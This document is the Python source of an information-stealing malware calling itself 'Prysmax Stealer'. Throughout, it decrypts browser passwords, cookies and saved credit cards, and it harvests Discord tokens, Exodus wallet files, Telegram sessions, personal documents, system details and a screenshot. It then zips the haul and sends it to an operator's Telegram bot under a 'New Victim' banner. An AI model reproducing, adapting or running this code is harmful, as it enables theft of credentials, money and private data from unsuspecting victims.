import os, requests, json, base64, sqlite3, shutil, uuid, wmi, psutil, subprocess, glob, re
import platform as platform_module

from PIL import ImageGrab
from zipfile import ZipFile
from telegram import InputFile


from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
from telegram import Bot

prysmax = "token-here"
chat_id = "chat-id"

bot = Bot(token=prysmax)

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

search_in = "Default"
extensions_to_search = ['.png', '.jpg', '.pdf', '.docx'] # If you want to add more, add :))

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

def check_and_close_browser(browser_name):
    for process in psutil.process_iter(['pid', 'name', 'username']):
        if browser_name.lower() in process.info['name'].lower():
            try:
                os.kill(process.info['pid'], 9)
                print(f"¡Adiós {browser_name}! ")
            except PermissionError:
                print(f"No tienes permisos para cerrar {browser_name}.")
            except Exception as e:
                print(f"Ups, algo salió mal al intentar cerrar {browser_name}. Detalles: {str(e)}")
def get_master_key(path: str):
    try:
        if not os.path.exists(path):
            return

        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            return

        with open(local_state_path, "r", encoding="utf-8") as f:
            c = f.read()

        local_state = json.loads(c)

        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
            return

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Error in get_master_key: {str(e)}")
        return None

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    if master_key is None:
        return "Error: Master key is None"

    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    try:
        decrypted_pass = decrypted_pass[:-16].decode(errors='ignore')
    except UnicodeDecodeError:
        decrypted_pass = "Error al decodificar la contraseña"
    return decrypted_pass

total_browsers = 0


def save_results(browser_name, data_type, content):
    global total_browsers

    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
    total_browsers += 1

def get_login_data(path: str, profile: str, master_key):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        return ""

    result = ""
    shutil.copy(login_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))

    try:
        conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = decrypt_password(row[2], master_key)
            result += f"""
            URL: {row[0]}
            Email: {row[1]}
            Password: {password}
            """
    except sqlite3.DatabaseError as e:
        print(f"Error accessing the database. Details: {str(e)}")
    finally:
        if conn:
            conn.close()

    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    for browser in available_browsers:
            browser_path = browsers[browser]
            check_and_close_browser(browser)
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results
available_browsers = installed_browsers()

for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        
        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax'):
    os.mkdir(user+'\\AppData\\Local\\Temp\\Prysmax')
shutil.move(user+'\\AppData\\Local\\Temp\\Browser.zip', user+'\\AppData\\Local\\Temp\\Prysmax')

import os

def find_antivirus_folders(base_folder):
    antivirus_names = [
        "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "Sophos"
        "ESET", "Malwarebytes", "Avira", "Panda", "Trend Micro", "F-Secure", "McAfee", "Comodo", "Avira", 
        "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", "ClamWin", "ZoneAlarm",
        "Cylance", "Webroot", "Cylance", "Palo Alto Networks", "Symantec", "SentinelOne", "CrowdStrike",
        "Emsisoft", "HitmanPro", "Fortinet", "Trend Micro", "Emsisoft", "FireEye", "Cylance", "ESET",
        "Zemana", "McAfee", "Windows Defender"
    ]
    antivirus_folders_dict = {}

    antivirus_folders_set = set()

    for folder in os.listdir(base_folder):
        full_path = os.path.join(base_folder, folder)

        if os.path.isdir(full_path):
            for antivirus_name in antivirus_names:
                if antivirus_name.lower() in folder.lower():
                    antivirus_folders_dict[antivirus_name] = folder

    return antivirus_folders_dict

    return antivirus_folders_set



def search_and_copy_files(start_folder, dest_folder, search_all=False):
    specific_folders = ['Desktop', 'Documents', 'Downloads', 'Pictures']

    for root, dirs, files in os.walk(start_folder):
        if not search_all:
            dirs[:] = [d for d in dirs if d in specific_folders]

        for file in files:
            file_path = os.path.join(root, file)
            _, extension = os.path.splitext(file_path)

            if extension.lower() in extensions_to_search:
                destination_path = os.path.join(dest_folder, file)
                shutil.copy(file_path, destination_path)
                print(f"Stealing {file_path} to {destination_path}")
def machine_info():


    mem = psutil.virtual_memory()

    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
        
    current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode('utf-8').split('\n')[1].strip()
    try:
        with os.popen('wmic path softwarelicensingservice get OA3xOriginalProductKey') as process:
            resultado = process.read()
            clave_producto = resultado.split('\n')[1].strip()
    except Exception as e:
        clave_producto = str(e)

    # pc info
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

    pc_name = platform_module.node()
    pc_os = platform_module.platform()
    pc_cpu = platform_module.processor()
    pc_hwid = current_machine_id
    pc_ram = mem.total / 1024**3
    pc_gpu = GPUm
    pc_key = clave_producto
    if pc_key == None:
        pc_key = "Nothing"

    # network info
    getip = requests.get("http://ip-api.com/json/").json()
    theip = getip["query"]
    ip = requests.get(f"http://ip-api.com/json/{theip}?fields=192511").json()
    ip_country = ip.get("country", "Error")
    ip_region = ip.get("regionName", "Error")
    ip_city = ip.get("city", "Error")
    ip_isp = ip.get("isp", "Error")
    ip_proxy = ip.get("proxy", "Error")
    
    tasklists = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
    
    main_folders = [os.path.expanduser("~"), os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')]
    
    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax\\files'):
     os.mkdir(user+'\\AppData\\Local\\Temp\\Prysmax\\files')
    else:
        os.removedirs(user+'\\AppData\\Local\\Temp\\Prysmax\\files')
    
    
    if search_in == "Default":
     for folder in main_folders:
        search_and_copy_files("C:\\", user+'\\AppData\\Local\\Temp\\Prysmax\\files')
    else:
        search_and_copy_files("C:\\", user+'\\AppData\\Local\\Temp\\Prysmax\\files', search_all=False)
    

    antivirus_folders = find_antivirus_folders("C:\\Program Files")

    if antivirus_folders:
        print("Antivirus encontrados:")
        for antivirus_name, folder_name in antivirus_folders.items():
            print(f"{antivirus_name}: {folder_name}")
    else:
        print("not foun.")
        

    
    
    process_task = False
    if tasklists.returncode == 0:
     with open(user+'\\AppData\\Local\\Temp\\Prysmax\\process_list.txt', 'w') as file:
        file.write(tasklists.stdout)
     print('The process list has been saved in "process_list.txt".')
     num_procesos = tasklists.stdout.count('\n') - 3
     process_task = True
    else:
     print('There was an error in obtaining the list of processes.')
     process_task = False
    with open(user+'\\AppData\\Local\\Temp\\Prysmax\\information.txt', 'w', encoding='utf-8') as archivo:
        # Escribe información en el archivo
        archivo.write(f"""
                      
        ¡PRYSMAX STEALER!
        
    ╠       Network Info🌐                 
    ╠  ╒  IP: {theip}
    ╠   ╒  Country: {ip_country}
    ╠    ╒  Region: {ip_region}
    ╠      ╒  City: {ip_city}
    ╠       ╒  Vpn: {ip_proxy}
    ╠         ╒  ISP: {ip_isp}
    ╠
    
    ╠     Machine Info 🖥 
    ╠  ╒ Pc Name: {pc_name}
    ╠    ╒ OS: {pc_os}
    ╠     ╒ CPU: {pc_cpu}
    ╠      ╒ HWID: {pc_hwid}
    ╠       ╒ RAM: {pc_ram}
    ╠        ╒ GPU: {pc_gpu}
    ╠         ╒ Windows Key: {pc_key}
    ╠           ╒  Antiviruses: {antivirus_name}
                  ╒ List of process: {num_procesos}

""")
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }
    Discord = False
    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)
                                        with open(user+'\\AppData\\Local\\Temp\\Prysmax\\discord_tokens.txt', 'w', encoding='utf-8') as tokensfile:
                                            # Escribe información en el archivo
                                            tokensfile.write(str(tokens))
                                            Discord = True
    exodus = False
    if os.path.exists(user + "\\AppData\\Local\\Temp\\Exodus"):
        shutil.rmtree(user + "\\AppData\\Local\\Temp\\Exodus")
        exodus = True
        shutil.copytree(user + "\\AppData\\Roaming\\Exodus", user + "\\AppData\\Local\\Temp\\Prysmax\\Exodus")
    else:
        exodus = False
    telegram = False
    prysmax_tele = "prysmax_telegram"
    if os.path.exists(user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'):
        
     if os.path.exists(os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")):
      print("la victima ya abrio el archivo, yesyes")
      shutil.copy(os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip"),
                os.path.join(user, 'AppData', 'Local', 'Temp', 'Prysmax', prysmax_tele + ".zip"))
      telegram = True
     else:
        tdata_path = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
        tdata_session_zip = user + '\\AppData\\Roaming\\Telegram Desktop\\' + prysmax_tele + ".zip"
        hash_path = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'

        # Creating folders
        os.makedirs(tdata_path + '\\connection_hash')
        os.makedirs(tdata_path + '\\map')


        hash_map = glob.iglob(os.path.join(hash_path, "*"))
        for file in hash_map:
            if os.path.isfile(file):
                shutil.copy2(file, tdata_path + '\\map')

        # Copying files
        # If hash file has 15 letters
        files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
        for file in files16:
            if os.path.isfile(file):
                shutil.copy2(file, tdata_path + '\\connection_hash')

        # Archivation folders
        with ZipFile(tdata_session_zip, 'w') as zipObj:
            # Iterate over all the files in directory
            for folderName, subfolders, filenames in os.walk(tdata_path + '\\map'):
                for filename in filenames:
                    # Create complete filepath of file in directory
                    filePath = os.path.join(folderName, filename)
                    # Add file to zip
                    zipObj.write(filePath)

            for folderName, subfolders, filenames in os.walk(tdata_path + '\\connection_hash'):
                for filename in filenames:
                    # Create complete filepath of file in directory
                    filePath = os.path.join(folderName, filename)
                    # Add file to zip
                    zipObj.write(filePath)

        # Remove temporary folders
        shutil.rmtree(tdata_path + '\\connection_hash')
        shutil.rmtree(tdata_path + '\\map')  
        # Rename the archive
        old_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
        new_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', prysmax_tele + ".zip")
        os.rename(old_file, new_file)
        shutil.copytree(user + '\\AppData\\Roaming\\Telegram Desktop\\', prysmax_tele + ".zip", user + '\\AppData\\Local\\Temp\\Prysmax\\', prysmax_tele + ".zip")
        Telegram = True
    else:
        Telegram = False
    try:
    
     sss = ImageGrab.grab()
     sss.save(user+"\\AppData\\Local\\Temp\\Prysmax\\screenshot.png")

     sss.close()
     screenshot = True
    except:
        screenshot = False
    pc_stolen = f"""
          Prysmax Stealer - New Victim ⚠️
  
    ╔
    ╠       Network Info🌐                 
    ╠  ╒  IP: {theip}
    ╠   ╒  Country: {ip_country}
    ╠    ╒  Region: {ip_region}
    ╠      ╒  City: {ip_city}
    ╠       ╒  Vpn: {ip_proxy}
    ╠         ╒  ISP: {ip_isp}
    ╠
    
    ╠     Machine Info 🖥 
    ╠  ╒ Pc Name: {pc_name}
    ╠    ╒ OS: {pc_os}
    ╠     ╒ CPU: {pc_cpu}
    ╠      ╒ HWID: {pc_hwid}
    ╠       ╒ RAM: {pc_ram}
    ╠        ╒ GPU: {pc_gpu}
    ╠         ╒ Windows Key: {pc_key}
               ╒ Antiviruses: {antivirus_name}

    ╠    Sessions - 💶
    
    ╠   Telegram: {telegram}
    
    ╠   Discord: {Discord}
    
    ╠   Browsers Files: {total_browsers}
    
    ╠   Exodus: {exodus}

    ╠   Screenshot: {screenshot}
    
    ╠   Process Running: {num_procesos}
    """  
    temp_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')

    folder_to_compress = os.path.join(temp_folder, 'Prysmax')

    zip_name = os.path.join(temp_folder, 'Prysmax')

    shutil.make_archive(zip_name, 'zip', folder_to_compress)
    bot.send_message(chat_id=chat_id, text=pc_stolen)
    file_path = user + '\\AppData\\Local\\Temp\\Prysmax.zip'
    with open(file_path, 'rb') as file:
        bot.send_document(chat_id=chat_id, document=InputFile(file))
machine_info()
